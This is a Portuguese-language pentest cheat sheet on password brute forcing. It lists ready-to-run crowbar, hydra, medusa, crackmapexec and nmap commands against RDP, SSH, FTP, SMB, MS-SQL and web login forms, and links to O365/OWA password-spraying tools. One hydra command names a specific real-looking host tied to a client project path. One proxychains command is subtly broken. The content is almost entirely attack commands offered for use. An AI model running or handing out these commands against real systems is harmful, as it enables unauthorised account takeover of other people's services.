Brute forcing
========================

# crowbar

## RDP
Essa ferramenta que pode realmente executar brute force no RDP das máquinas.
    
    sudo apt install crowbar
    crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1


https://www.hackingarticles.in/4-ways-to-hack-ms-sql-login-password/
# hydra
source:
https://en.kali.tools/?p=220

<https://github.com/frizb/Hydra-Cheatsheet>

Colocar o proxy, mas isso é para HTTP

Use HYDRA_PROXY_HTTP or HYDRA_PROXY environment variables for a proxy setup.
E.g. % export HYDRA_PROXY=socks5://l:p@127.0.0.1:9150 (or: socks4:// connect://)
     % export HYDRA_PROXY=connect_and_socks_proxylist.txt  (up to 64 entries)
     % export HYDRA_PROXY_HTTP=http://login:pass@proxy:8080
     % export HYDRA_PROXY_HTTP=proxylist.txt  (up to 64 entries)

No caso de HTTPS, é interessante utilizar o proxychains:

    sudo cat "http    127.0.0.1    8080" >> /etc/proxychains4.conf
    
    hydra -L owncloud/Area_de_trabalho/Vivo/Delonia_RTPROJ-623/users.txt -P /usr/share/wordlists/rockyou.txt uat.delonia.com https-post-form "/claims/:LOGIN=^USER^&PASSWORD=^PASS^&submit=Login:An error occurred during authentication"


## RDP

    $ hydra -L users.txt -P pass.txt rdp://[target]

## Mssql
    hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt 192.168.1.128 mssql
    
## ssh
    hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1

## ftp
    hydra -l root -P 500-worst-passwords.txt 10.10.10.10 ftp

## smb
    hydra -L /root/Desktop/user.txt -P /root/Desktop/pass.txt 192.168.1.118 smb
    #Utilizando o crackmapexec
    crackmapexec smb 10.10.10.130 -u users.txt -p passwords.txt



## http

### get
    hydra -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt 10.11.1.209 -s 8080 http-get /manager/html
    
onde -s é a porta
http-get é o método a ser utilizado
/manager/html é o diretório pelo qual estamos tentando nos autenticar
e - C colon separated "login:pass" format, instead of -L/-P options

### post

    hydra -l root@locahost -P /usr/share/wordlist/rockyou.txt 10.11.1.39 http-post-form "/otrs/index.pl:Action=Login&RequestedURL=&Lang=en&TimeOffset=300&User=root@localhost&Password=^PASS^:Login failed!"


# Medusa
    
    
    
## Mssql    
    medusa -h 192.168.1.128 –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssql

## ssh
    medusa -u root -P 500-worst-passwords.txt -h 10.10.10.10 -M ssh

## HTTP
    medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin

## ftp
    medusa -u test -P 500-worst-passwords.txt -h 10.10.10.10 -M ftp

## smb
    medusa -h 192.168.1.118 -U /root/Desktop/user.txt -P /root/Desktop/pass.txt -M smbnt




## Generic

    medusa -h 192.168.1.20 -u admin -P passwords.txt -M [smbnt | ssh | mssql | http]

xHydra
graphical interface


# Supported protocols by tool

Hydra - TELNET, FTP, HTTP, HTTPS, HTTP-PROXY, SMB, SMBNT, MS-SQL, MYSQL, REXEC, irc, RSH, RLOGIN, CVS, SNMP, SMTP, SOCKS5, VNC, POP3, IMAP, NNTP, PCNFS, XMPP, ICQ, SAP/R3, LDAP2, LDAP3, Postgres, Teamspeak, Cisco auth, Cisco enable, AFP, Subversion/SVN, Firebird, LDAP2, Cisco AAA

Medusa -  AFP, CVS, FTP, HTTP, IMAP, MS-SQL, MySQL, NetWare NCP, NNTP, PcAnywhere, POP3, PostgreSQL, REXEC, RLOGIN, RSH, SMBNT, SMTP-AUTH, SMTP-VRFY, SNMP, SSHv2, Subversion (SVN), Telnet, VMware Authentication Daemon (vmauthd), VNC, Generic Wrapper,
Web Form

Ncrack - RDP, SSH, http(s), SMB, pop3(s), VNC, FTP, telnet

# nmap 
nmap -p 1433 –script ms-sql-brute –script-args userdb=/root/Desktop/user.txt,passdb=/root/Desktop/pass.txt 192.168.1.128

|Name|Description|URL|
|-----|-----------|----|
|SprayingToolkit|Scripts to make password spraying attacks against Lync/S4B, OWA & O365 a lot quicker, less painful and more efficient|https://github.com/byt3bl33d3r/SprayingToolkit|
|o365recon|Retrieve information via O365 with a valid cred|https://github.com/nyxgeek/o365recon|